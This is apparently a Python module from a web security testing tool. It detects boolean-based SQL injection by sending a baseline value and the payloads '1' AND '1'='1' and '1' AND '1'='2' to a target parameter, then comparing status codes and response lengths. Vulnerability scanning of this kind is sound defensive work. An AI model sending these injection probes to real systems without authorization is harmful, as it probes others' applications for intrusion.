"""
Boolean-based SQL injection test logic.

Checks for SQLi by comparing response behaviour for baseline,
true condition, and false condition.
"""

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from rmlw.workbench.core import WebAttackWorkbench


def test_sqli_boolean(workbench: "WebAttackWorkbench", url: str, param: str) -> None:
    """
    Run boolean-based SQLi probes.

    Sends three requests:
        - Baseline: param=1
        - True: param=1' AND '1'='1
        - False: param=1' AND '1'='2

    If true behaves like baseline and false differs significantly,
    records a candidate sqli_boolean finding.

    Args:
        workbench: The WebAttackWorkbench instance.
        url: Endpoint URL.
        param: Parameter name to inject.
    """
    try:
        baseline = workbench.session.get(
            url,
            params={param: "1"},
            timeout=workbench.config.request_timeout,
            verify=workbench.config.verify_tls,
        )
        true_r = workbench.session.get(
            url,
            params={param: "1' AND '1'='1"},
            timeout=workbench.config.request_timeout,
            verify=workbench.config.verify_tls,
        )
        false_r = workbench.session.get(
            url,
            params={param: "1' AND '1'='2"},
            timeout=workbench.config.request_timeout,
            verify=workbench.config.verify_tls,
        )
    except Exception:
        return

    same_true_code = true_r.status_code == baseline.status_code
    small_true_diff = abs(len(true_r.text) - len(baseline.text)) < 10
    code_changed = false_r.status_code != baseline.status_code
    large_false_diff = abs(len(false_r.text) - len(baseline.text)) > 50

    if same_true_code and small_true_diff and (code_changed or large_false_diff):
        workbench._record(
            "sqli_boolean",
            url,
            param,
            "1' AND '1'='1",
            {
                "baseline_code": baseline.status_code,
                "true_code": true_r.status_code,
                "false_code": false_r.status_code,
                "baseline_len": len(baseline.text),
                "true_len": len(true_r.text),
                "false_len": len(false_r.text),
            },
        )
